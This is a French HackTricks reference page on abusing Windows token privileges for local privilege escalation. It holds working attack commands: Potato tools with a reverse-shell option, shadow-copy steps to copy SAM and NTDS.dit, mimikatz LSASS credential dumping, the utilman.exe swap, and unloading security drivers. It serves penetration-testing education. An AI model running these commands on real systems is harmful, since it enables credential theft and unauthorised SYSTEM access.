# Abus des tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Si vous **ne savez pas ce que sont les Windows Access Tokens**, lisez cette page avant de continuer :


{{#ref}}
access-tokens.md
{{#endref}}

**Vous pouvez peut-être escalader vos privilèges en abusant des tokens que vous détenez déjà.**

### SeImpersonatePrivilege

Ce privilège permet à un processus d'emprunter l'identité d'un token (mais pas d'en créer un) lorsqu'il peut obtenir un handle vers ce token. Un token privilégié peut être obtenu auprès d'un service Windows (DCOM) en l'incitant à effectuer une authentification NTLM auprès d'un exploit, ce qui permet ensuite d'exécuter un processus avec les privilèges SYSTEM.<sup>[[2]](#references)</sup> Cette primitive peut être exploitée à l'aide d'outils tels que [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (qui nécessite que WinRM soit désactivé), [SweetPotato](https://github.com/CCob/SweetPotato) et [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Une application web accessible uniquement via loopback peut constituer une piste de coercition distincte si un utilisateur local peut accéder à un endpoint authentifié qui effectue une requête vers une URL choisie par l'appelant, sous une identité plus privilégiée. Vérifiez les contrôles d'autorisation et les restrictions d'URL de l'endpoint, l'identité réellement utilisée par le client sortant et son comportement d'authentification, ainsi que la possibilité pour ce client d'accéder à un listener contrôlé par l'utilisateur aux privilèges inférieurs. La présence de `SeImpersonatePrivilege`, d'un listener IIS ou d'un paramètre de récupération d'URL ne suffit pas, à elle seule, à établir l'existence d'un token privilégié ou d'une voie d'escalade. Limitez cet examen à une analyse passive ; n'envoyez pas de requêtes de coercition pendant l'énumération. Consultez la documentation Microsoft sur [l'emprunt d'identité du client](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) et [l'identité du pool d'applications IIS](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Notes récentes pour les opérateurs :

- **JuicyPotato est obsolète** : sous Windows 10 1809+/Server 2019+, préférez **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ou **PrintSpoofer**, selon la surface RPC/COM encore accessible.
- Si vous avez compromis un service exécuté sous **`LOCAL SERVICE`** ou **`NETWORK SERVICE`** et que `whoami /priv` affiche un **token filtré** sans `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, commencez par rétablir l'ensemble de privilèges **par défaut** du compte (par exemple avec **FullPowers**), puis réessayez la famille potato.<sup>[[3]](#references)</sup>
- Certains forks récents sont plus pratiques pour les opérateurs que les outils d'origine. Par exemple, **SigmaPotato** ajoute l'exécution par réflexion/en mémoire et la compatibilité avec les versions modernes de Windows, tandis que **PrintNotifyPotato** abuse du service COM PrintNotify et est souvent utile lorsque le chemin classique via Spooler est désactivé.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

C'est très similaire à **SeImpersonatePrivilege** : cette méthode utilise le **même procédé** pour obtenir un token privilégié.\
Ce privilège permet ensuite **d'assigner un token primaire** à un nouveau processus ou à un processus suspendu. Avec le token d'impersonation privilégié, vous pouvez dériver un token primaire (DuplicateTokenEx).\
Avec ce token, vous pouvez créer un **nouveau processus** avec 'CreateProcessAsUser' ou créer un processus suspendu et **lui assigner le token** (en général, vous ne pouvez pas modifier le token primaire d'un processus en cours d'exécution).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Si ce token est activé, vous pouvez utiliser **KERB_S4U_LOGON** pour obtenir un **token d'impersonation** pour n'importe quel autre utilisateur sans connaître ses identifiants, **ajouter un groupe arbitraire** (admins) au token, définir le **niveau d'intégrité** du token sur "**medium**" et assigner ce token au **thread actuel** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Ce privilège permet au système **d'accorder un accès en lecture** à n'importe quel fichier (limité aux opérations de lecture). Il est utilisé pour **lire les hashes de mot de passe des comptes Administrator locaux** depuis le registre, puis pour utiliser des outils comme "**psexec**" ou "**wmiexec**" avec le hash (technique Pass-the-Hash). Cette technique échoue toutefois dans deux cas : si le compte Local Administrator est désactivé ou si une stratégie supprime les droits administratifs des comptes Local Administrator qui se connectent à distance.<sup>[[2]](#references)</sup>\
En pratique, la procédure intégrée la plus fiable consiste généralement à utiliser **VSS + `robocopy /b`** : créer/exposer une copie instantanée, puis copier `SAM`/`SYSTEM` ou `NTDS.dit` en **mode sauvegarde**, ce qui contourne les ACL des fichiers.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

You pouvez **abuser de ce privilège** avec :

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- en suivant **IppSec** dans [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ou comme expliqué dans la section **escalating privileges with Backup Operators** de :

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ce privilège permet un **accès en écriture** à n’importe quel fichier système, indépendamment de la liste de contrôle d’accès (ACL) du fichier. Il offre de nombreuses possibilités d’escalade, notamment la possibilité de **modifier des services**, de réaliser du DLL Hijacking et de définir des **debuggers** via les Image File Execution Options, entre autres techniques.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege est un privilège puissant, particulièrement utile lorsqu’un utilisateur peut usurper des tokens, mais aussi en l’absence de SeImpersonatePrivilege. Cette capacité dépend de la possibilité d’usurper un token représentant le même utilisateur et dont le niveau d’intégrité ne dépasse pas celui du processus actuel.<sup>[[2]](#references)</sup>

**Points clés :**

- **Usurpation sans SeImpersonatePrivilege :** Il est possible d’exploiter SeCreateTokenPrivilege pour une EoP en usurpant des tokens dans certaines conditions.
- **Conditions d’usurpation de token :** Pour réussir, le token cible doit appartenir au même utilisateur et avoir un niveau d’intégrité inférieur ou égal à celui du processus qui tente l’usurpation.
- **Création et modification de tokens d’usurpation :** Les utilisateurs peuvent créer un token d’usurpation et l’enrichir en ajoutant le SID (Security Identifier) d’un groupe privilégié.

### SeLoadDriverPrivilege

Ce privilège permet à un processus de **charger et décharger des pilotes de périphériques** en créant une entrée de registre avec des valeurs `ImagePath` et `Type` spécifiques. L’accès direct en écriture à `HKLM` (HKEY_LOCAL_MACHINE) étant restreint, `HKCU` (HKEY_CURRENT_USER) peut être utilisé à la place. Toutefois, un chemin spécifique est nécessaire pour que le noyau reconnaisse l’entrée `HKCU` comme une configuration de pilote.<sup>[[2]](#references)</sup>

L’utilisation offensive moderne consiste généralement à pratiquer le **BYOVD** (bring your own vulnerable driver) : charger un pilote noyau **signé mais vulnérable**, puis utiliser ses IOCTL pour désactiver des protections ou obtenir l’exécution de code dans le noyau. À noter que sur les versions récentes de Windows 11/Server, la **Microsoft vulnerable driver blocklist** et/ou **HVCI/Memory Integrity** empêchent souvent les anciennes chaînes publiques de fonctionner ; les exemples classiques de type `szkg64.sys` ne sont donc plus fiables dans tous les cas.

Le chemin est `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, où `<RID>` est l’identifiant relatif de l’utilisateur actuel. Dans `HKCU`, il faut créer l’intégralité de ce chemin et définir deux valeurs :<sup>[[2]](#references)</sup>

- `ImagePath`, qui correspond au chemin du binaire à exécuter
- `Type`, avec la valeur `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Étapes à suivre :**

1. Utilisez `HKCU` plutôt que `HKLM`, car l’accès en écriture est restreint.
2. Créez le chemin `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dans `HKCU`, où `<RID>` correspond à l’identifiant relatif de l’utilisateur actuel.
3. Définissez `ImagePath` sur le chemin d’exécution du binaire.
4. Attribuez à `Type` la valeur `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Plus de façons d’abuser de ce privilège : [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Ce privilège est similaire à **SeRestorePrivilege**. Sa fonction principale permet à un processus de **devenir propriétaire d’un objet**, en contournant l’obligation d’obtenir explicitement un accès discrétionnaire grâce à l’octroi des droits d’accès WRITE_OWNER. Le processus consiste d’abord à obtenir la propriété de la clé de registre ciblée à des fins d’écriture, puis à modifier la DACL pour autoriser les opérations d’écriture.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Ce privilège permet de **déboguer d’autres processus**, notamment de lire et d’écrire dans leur mémoire. Diverses stratégies d’injection mémoire, capables d’échapper à la plupart des solutions antivirus et de prévention des intrusions sur l’hôte, peuvent être utilisées avec ce privilège.<sup>[[2]](#references)</sup>

Sur les versions modernes de Windows, gardez à l’esprit que `SeDebugPrivilege` suffit généralement à ouvrir des **processus SYSTEM non protégés** et à dupliquer leurs tokens, mais ne garantit **pas** que vous puissiez accéder à **LSASS**. Si **RunAsPPL / LSA Protection** est activé, les processus non protégés ne peuvent ni lire ni injecter du code dans LSASS, même si `SeDebugPrivilege` est présent. Dans ce cas, volez un token d’un autre processus SYSTEM non-PPL, ou enchaînez avec un contournement PPL/BYOVD au lieu de supposer que `procdump` fonctionnera. Pour un exemple complet de copie de token utilisant `SeDebugPrivilege` + `SeImpersonatePrivilege`, consultez [cette page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Vous pouvez utiliser [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de la [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) pour **capturer la mémoire d’un processus**. Cela peut notamment s’appliquer au processus **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, chargé de stocker les identifiants des utilisateurs après leur connexion au système.

Vous pouvez ensuite charger ce dump dans mimikatz pour obtenir les mots de passe :

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Un dump LSASS lisible, enregistré précédemment, peut être disponible même si le compte actuel n’a pas l’autorisation de capturer le processus protégé en cours d’exécution. Considérez un fichier dump ou une archive portant un nom similaire comme une simple piste : vérifiez l’accès et le contenu, puis déterminez si les identifiants récupérés sont toujours valides et permettent d’obtenir un contexte avec des privilèges plus élevés. Le nom d’un fichier ne prouve ni que l’archive contient un dump, ni que les identifiants sont réutilisables.

#### RCE

Pour obtenir un shell `NT SYSTEM`, vous pouvez utiliser :

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Ce droit (Effectuer des tâches de maintenance des volumes) peut permettre d’effectuer des opérations privilégiées sur les volumes, mais ne garantit pas à lui seul l’obtention d’un handle lisible vers un volume brut ni un accès arbitraire aux fichiers. Les ACL des périphériques, l’état du token, la version de Windows et l’opération demandée restent déterminants. Une opération de contrôle de volume autorisée peut plutôt modifier les ACL du système de fichiers ; il s’agit alors d’une action modificatrice susceptible d’affecter l’ensemble du volume. Sur un hôte CA, l’abus de certificats nécessite également l’accès à du matériel de clé privée utilisable, et les fichiers protégés par EFS nécessitent toujours une clé de déchiffrement ou de récupération autorisée. Voir ci-dessous les prérequis détaillés.<sup>[[5]](#references)</sup>

Voir les techniques détaillées et les mesures d’atténuation :

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Vérifier les privilèges

```
whoami /priv
```

Les **tokens indiqués comme Disabled** peuvent généralement être activés ; vous pouvez donc souvent exploiter les privilèges _Enabled_ comme _Disabled_.

### Activer tous les tokens

Si vous avez des privilèges désactivés, vous pouvez utiliser le script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) pour activer tous les tokens :

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Ou le **script** intégré à cet [**article**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Aide-mémoire complet des privilèges de token sur [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) ; le résumé ci-dessous ne présente que les méthodes directes pour exploiter le privilège afin d’obtenir une session administrateur ou de lire des fichiers sensibles.<sup>[[1]](#references)</sup>

| Privilège                  | Impact       | Outil                    | Chemin d’exécution                                                                                                                                                                                                                                                                                                                                  | Remarques                                                                                                                                                                                                                                                                                                                       |
| -------------------------- | ------------ | ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`SeAssignPrimaryToken`** | _**Administrateur**_ | Outil tiers          | _"Il permettrait à un utilisateur d’usurper des tokens et d’élever ses privilèges jusqu’à NT SYSTEM à l’aide d’outils tels que potato.exe, rottenpotato.exe et juicypotato.exe"_                                                                                                                                                                   | Merci à [Aurélien Chalot](https://twitter.com/Defte_) pour la mise à jour. Je vais essayer de reformuler cela bientôt sous la forme d’une recette plus claire.                                                                                                                                                                  |
| **`SeBackup`**             | **Menace**   | _**Commandes intégrées**_ | Lire des fichiers sensibles avec `robocopy /b` ou des outils dédiés de copie prenant en charge SeBackup.                                                                                                                                                                                                                                          | <p>- Pratique pour `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` et parfois `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` est pratique, mais les cmdlets/APIs SeBackup dédiés sont souvent plus flexibles pour les fichiers verrouillés/ouverts.</p>                                                                                  |
| **`SeCreateToken`**        | _**Administrateur**_ | Outil tiers          | Créer un token arbitraire incluant les droits d’administrateur local avec `NtCreateToken`.                                                                                                                                                                                                                                                         |                                                                                                                                                                                                                                                                                                                                 |
| **`SeDebug`**              | _**Administrateur**_ | **PowerShell**       | Dupliquer un token SYSTEM **non-PPL** ou extraire la mémoire d’un processus non protégé.                                                                                                                                                                                                                                                             | <p>L’extraction de LSASS est généralement bloquée si RunAsPPL/LSA Protection est activé.</p><p>Script disponible sur [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                      |
| **`SeImpersonate`**        | _**Administrateur**_ | Outil tiers          | Utiliser la **famille Potato** / l’usurpation via named pipe pour lancer SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                             | <p>La méthode est particulièrement pratique depuis des comptes de service tels que IIS APPPOOL, MSSQL, des tâches planifiées, ou tout contexte disposant déjà de `SeImpersonatePrivilege`.</p>                                                                                                                               |
| **`SeLoadDriver`**         | _**Administrateur**_ | Outil tiers          | <p>1. Charger un pilote vulnérable signé (BYOVD)<br>2. Utiliser les IOCTL du pilote pour obtenir un accès R/W au kernel, désactiver les outils de sécurité ou élever ses privilèges jusqu’à SYSTEM<br><br>Ce privilège peut également servir à décharger des pilotes liés à la sécurité avec la commande intégrée <code>fltMC</code>, par exemple <code>fltMC sysmondrv</code></p> | <p>Les anciens pilotes publics comme <code>szkg64.sys</code> sont de plus en plus bloqués sur les versions récentes de Windows par la liste de blocage des pilotes vulnérables / HVCI.</p>                                                                                                                                      |
| **`SeRestore`**            | _**Administrateur**_ | **PowerShell**       | <p>1. Lancer PowerShell/ISE avec le privilège SeRestore présent.<br>2. Activer le privilège avec <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Renommer utilman.exe en utilman.old<br>4. Renommer cmd.exe en utilman.exe<br>5. Verrouiller la console et appuyer sur Win+U</p> | <p>L’attaque peut être détectée par certains logiciels antivirus.</p><p>Une autre méthode consiste à remplacer les binaires de service stockés dans "Program Files" à l’aide du même privilège.</p>                                                                                                                           |
| **`SeTakeOwnership`**      | _**Administrateur**_ | _**Commandes intégrées**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Renommer cmd.exe en utilman.exe<br>4. Verrouiller la console et appuyer sur Win+U</p>                                                                                                                        | <p>L’attaque peut être détectée par certains logiciels antivirus.</p><p>Une autre méthode consiste à remplacer les binaires de service stockés dans "Program Files" à l’aide du même privilège.</p>                                                                                                                           |
| **`SeTcb`**                | _**Administrateur**_ | Outil tiers          | <p>Manipuler les tokens pour leur ajouter des droits d’administrateur local. SeImpersonate peut être nécessaire.</p><p>À vérifier.</p>                                                                                                                                                                                                               |                                                                                                                                                                                                                                                                                                                                 |

## References

- [1] [gtworek/Priv2Admin - chemins d’exploitation des privilèges Windows vers les droits administrateur](https://github.com/gtworek/Priv2Admin)
- [2] [Abus des privilèges de token pour une élévation locale de privilèges (LPE)](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Rendez-moi mes privilèges ! S’il vous plaît ?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` : le mode sauvegarde contourne les vérifications ACL des fichiers/dossiers)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Effectuer des tâches de maintenance de volume (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB : Certificate (SeManageVolumePrivilege → exfiltration de la clé de CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
